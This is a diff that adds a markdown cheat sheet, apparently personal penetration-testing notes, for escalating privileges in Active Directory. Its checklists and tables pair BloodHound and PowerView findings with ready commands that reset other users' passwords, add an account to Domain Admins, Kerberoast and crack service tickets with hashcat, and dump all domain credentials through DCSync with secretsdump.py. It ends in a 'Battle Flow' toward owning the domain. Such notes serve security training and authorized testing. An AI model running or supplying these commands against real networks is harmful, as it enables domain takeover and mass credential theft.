@@ -1,0 +1,106 @@
+**Find Access Points**
+
+-  Search BloodHound:
+    
+    -  `Shortest Path to DA`
+        
+    -  `Find Principals with DCSync Rights`
+        
+    -  `GenericWrite`, `GenericAll`, `ForceChangePassword`, `AddMember`
+        
+    -  `Kerberoastable Users`
+        
+-  Manual enumeration (PowerView / LDAPSearch) if BloodHound incomplete
+
+
+- [ ] Find Users You Can Modify
+- [ ] Run `Get-ObjectAcl -SamAccountName USERNAME | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite" }`
+
+- [ ]  Find Groups You Can Modify
+- [ ] Run `Get-ObjectAcl -SamAccountName GROUPNAME | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite" }`
+
+- [ ] List SPN Accounts (Kerberoast Targets)
+- [ ] Run `Get-DomainUser -SPN`
+
+- [ ] Find DCSync Capable Accounts
+- [ ] Run `Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" | ? {($_.ObjectType -match "DS-Replication-Get-Changes-All") -and ($_.ActiveDirectoryRights -match "GenericAll|WriteProperty|GenericWrite")}`
+
+
+---
+
+## ⚔️ 2. **Map Possible Chains**
+
+-  Does user have `GenericWrite` on another user/group?
+    
+    -  **Yes** → Reset SPN / password / ACL abuse
+        
+-  Does user have `AddMember` or `WriteOwner` rights?
+    
+    -  **Yes** → Add yourself to privileged groups
+        
+-  Does BloodHound show `AdminTo` somewhere useful?
+    
+    -  **Yes** → Pivot RDP, SMB, WinRM
+        
+-  Does user own an SPN account?
+    
+    -  **Yes** → Kerberoast → Crack → Escalate
+        
+
+---
+
+## 🧠 3. **Choose Path Based on What You Find**
+
+| Finding               | Action                           | Command                                                                                                                            |
+| --------------------- | -------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
+| GenericWrite on user  | Reset SPN/Password, pivot        | `Set-DomainUserPassword -Identity USERNAME -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force) -Verbose`   |
+| GenericWrite on group | Add yourself to group, pivot     | `Add-DomainGroupMember -Identity "GroupName" -Members "youruser"`                                                                  |
+| Kerberoastable SPN    | Extract TGS ticket and crack     | `Invoke-Kerberoast -OutputFormat Hashcat`                                                                                          |
+| AddMember rights      | Add yourself to Admin group      | `Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"`                                                              |
+| AdminTo relationship  | RDP/WinRM pivot to higher host   | `Pivot via RDP/WinRM after validating access with Evil-WinRM or xfreerdp3`                                                         |
+| DCSync rights         | Immediate DCSync via secretsdump | Coinfirm with `Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" \| ? {$_.ObjectType -match "DS-Replication-Get-Changes-All"}` |
+| DCSync Run            | SecretsDump.py                   | `secretsdump.py 'DOMAIN/USER:PASSWORD@DC_IP'`                                                                                      |
+
+---
+
+## 🛠️ 4. **Execute Abuse**
+
+-  **If GenericWrite** → Use PowerView or Rubeus to reset SPN/password
+- [ ] Run `Set-DomainUserPassword -Identity USERNAME -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force) -Verbose`
+-  **If Kerberoastable** → Rubeus dump TGS → hashcat crack
+- [ ] Run `Invoke-Kerberoast -OutputFormat Hashcat`
+-  **If AddMember** → PowerView addself to group
+- [ ] Run `Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"`
+-  **If AdminTo** → RDP in, dump hives, pillage creds
+- [ ] Run `Pivot via RDP/WinRM after validating access with Evil-WinRM or xfreerdp3`
+- [ ] Run `reg.exe commands, and other one liners to pillage` 
+-  **If DCSync available** → `secretsdump.py`
+- [ ] Run `secretsdump.py 'DOMAIN/USER:PASSWORD@DC_IP'`
+
+---
+
+## 🧹 5. **Cleanup and Reconfirm Access**
+
+-  Validate new group membership with BloodHound
+    
+-  Validate password reset / SPN abuse success
+    
+-  Check creds against critical machines (DC, DA members)
+    
+
+---
+
+## 🧠 ITTT — _If This Then That_ Mental Flow
+
+|IF|THEN|
+|---|---|
+|Found GenericWrite|Reset password or SPN and pivot user|
+|Found Kerberoastable|Dump TGS and hashcat crack ASAP|
+|Found AddMember|Add to high-priv group and re-run BloodHound|
+|Found AdminTo|RDP pivot to new machine and enumerate|
+|Found DCSync|Run secretsdump immediately and harvest|
+
+---
+
+# 🔥 Battle Flow Summary
+Enum Access ➝ Map Edge ➝ Choose Abuse ➝ Chain Up ➝ Confirm ➝ PWN DCSync ➝ Own Domain
